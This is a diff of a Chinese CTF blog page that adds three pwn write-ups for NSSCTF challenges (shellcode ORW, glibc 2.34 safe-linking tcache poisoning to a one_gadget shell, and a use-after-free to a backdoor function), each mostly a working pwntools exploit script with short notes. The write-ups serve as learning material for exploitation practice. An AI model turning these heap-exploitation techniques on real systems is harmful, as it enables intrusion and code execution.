@@ -76,6 +76,302 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/04/20/简单ORW初探/" title="简单ORW初探">
+                    简单ORW初探
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3488">[HGAME 2023 week1]simple_shellcode</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目提示重读 gdb动调 发现rdi有值<br>清空 rdx是0xcafe0000 直接转移<br>rdx也是读取字节 这里设置这么大无伤大雅 懒得改 直接syscall<br>然后根据之前的payload大小生成垃圾字符 后面跟shellcode 这样执行完刚好到我们shellcode<br>直接输出flag</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#from LibcSearcher import *</span>
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+io = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">24834</span>)
+<span class="hljs-comment">#io = process(&quot;./vuln&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
+	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
+    attach(io)
+
+s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+
+
+code = <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string">xor rdi,rdi</span>
+<span class="hljs-string">mov rsi,rdx</span>
+<span class="hljs-string">syscall</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&quot;&quot;&quot;</span>
+payload = asm(code) 
+ls(<span class="hljs-string">&quot;shellcode byte=&gt;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))
+<span class="hljs-comment">#bug()</span>
+sa(<span class="hljs-string">b&quot;shellcode&quot;</span>,payload)
+payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-built_in">len</span>(payload) + asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))
+s(payload1)
+
+
+io.interactive()</code></pre>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>对该题的考点总结</li>
+</ul>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
+                <a href="/2025/04/20/2-34-高版本libc-safe-linking-初体验-被恶心死了/" title="2.34 高版本libc safe-linking 初体验 (被恶心死了)">
+                    2.34 高版本libc safe-linking 初体验 (被恶心死了)
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2388">[CISCN 2022 华东北]duck</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>高版本libc2.34 照搬一下其他师傅的<br>现在的接收都是u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12<br>而修改heap的fd指针则是(heap_addr &gt;&gt; 12)^target_addr<br>默认创建0X100的chunk 然后跟之前一样打tcache满 然后到unsortbin泄露 main_arena + offset 然后可以得到libc_base 打_IO_file_jumps<br>_IO_file_jumps 结构第四个是_io_newfile_overflow 据说puts要用到<br>我是倒着free的 因为正着free会和top_chunk合并<br>所以也是倒着改fd libc2.34有safe-linking 加密fd 改完 new到结构 直接打onegadget 得到shell</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">
+  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+io = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28290</span>)
+<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+
+s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>():
+    sla(<span class="hljs-string">b&quot;Choice:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    sla(<span class="hljs-string">b&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(size))
+    sla(<span class="hljs-string">b&quot;Content:&quot;</span>,content)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    sla(<span class="hljs-string">b&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;Choice:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    sla(<span class="hljs-string">b&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+    new()
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+    free(<span class="hljs-number">7</span>-i)
+
+show(<span class="hljs-number">0</span>)
+leak_main_arena = uu64(ru(<span class="hljs-string">b&quot;Done&quot;</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>])
+ls(<span class="hljs-string">&quot;leak=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(leak_main_arena))
+libc_base = leak_main_arena -<span class="hljs-number">0x1f2c60</span> -<span class="hljs-number">0x60</span>
+ls(<span class="hljs-string">&quot;libc_base&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
+IO_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]
+ls(<span class="hljs-string">&quot;IO_file_jumps&quot;</span>+<span class="hljs-built_in">hex</span>(IO_file_jumps))
+show(<span class="hljs-number">7</span>)
+leak_heap_struct = uu64(ru(<span class="hljs-string">b&quot;Done&quot;</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">7</span>])  &lt;&lt; <span class="hljs-number">12</span>
+ls(<span class="hljs-string">&quot;leak_heap_struct&quot;</span>+<span class="hljs-built_in">hex</span>(leak_heap_struct))
+final_IO_file_chunk = (leak_heap_struct &gt;&gt; <span class="hljs-number">12</span>)^IO_file_jumps
+ls(<span class="hljs-string">&quot;final_IO_file_chunk&quot;</span>+<span class="hljs-built_in">hex</span>(final_IO_file_chunk))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
+    new()
+edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x10</span>,p64(final_IO_file_chunk) + p64(<span class="hljs-number">0</span>))
+new() <span class="hljs-comment">#13</span>
+new() <span class="hljs-comment">#14</span>
+one_gadget = libc_base + <span class="hljs-number">0xda864</span>
+edit(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(one_gadget))
+<span class="hljs-comment">#attach(io)</span>
+
+
+
+
+
+
+<span class="hljs-comment">#attach(io)</span>
+
+io.interactive()</code></pre>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>接收有点恶心了 safe-linking也是 还加密fd XOR 吐了</p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
+                <a href="/2025/04/20/入门的UAF/" title="入门的UAF">
+                    入门的UAF
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2161">[NISACTF 2022]UAF</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>sh\x00\x00对齐 然后NICO是后门函数</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+io = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28208</span>)
+<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span>)
+
+s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>():
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;Input your strings&quot;</span>,content)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+
+new()
+free(<span class="hljs-number">0</span>)
+new()
+edit(<span class="hljs-number">1</span>,(<span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span>+p32(e.sym[<span class="hljs-string">&quot;NICO&quot;</span>])))
+show(<span class="hljs-number">0</span>)
+
+
+<span class="hljs-comment">#attach(io)</span>
+
+io.interactive()</code></pre>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>对该题的考点总结</li>
+</ul>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/04/20/tcache二次巩固-malloc-hook-onegadget/" title="tcache二次巩固 + __malloc_hook + onegadget">
                     tcache二次巩固 + __malloc_hook + onegadget
                 </a>
@@ -686,7 +982,7 @@ p.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vmware-linux%E6%89%A9%E5%B1%95-%E6%A0%B9%E7%9B%AE%E5%BD%95-%E5%88%86%E5%8C%BA/">记一次vmware linux扩展/(根目录)分区</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/2021-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%99%A2%E6%A0%A1%E7%BB%84-K1ng-in-h3ap-I-stdout%E6%B3%84%E9%9C%B2libc%E5%88%9D%E6%8E%A2/">[2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2022-happy-note-%E9%AB%98%E7%89%88%E6%9C%ACglibc-IO-FILE%E5%88%9D%E6%8E%A2/">[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/">pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/">[SUCTF 2018 招新赛]unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/">[羊城杯 2023 决赛]Printf but not fmtstr</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/">从0开始的web生涯 - [第五空间 2021]WebFTP</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vmware-linux%E6%89%A9%E5%B1%95-%E6%A0%B9%E7%9B%AE%E5%BD%95-%E5%88%86%E5%8C%BA/">记一次vmware linux扩展/(根目录)分区</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/2021-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%99%A2%E6%A0%A1%E7%BB%84-K1ng-in-h3ap-I-stdout%E6%B3%84%E9%9C%B2libc%E5%88%9D%E6%8E%A2/">[2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2022-happy-note-%E9%AB%98%E7%89%88%E6%9C%ACglibc-IO-FILE%E5%88%9D%E6%8E%A2/">[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/23/pwngdb%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%8D%A2libc%E5%90%8E%E4%B8%8D%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7-IO-FILE%E7%AD%89%E7%BB%93%E6%9E%84%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98/">pwngdb解决更换libc后不加载符号/_IO_FILE等结构没有符号的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/21/SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink/">[SUCTF 2018 招新赛]unlink</a></li></ul>
         </div>
         
 
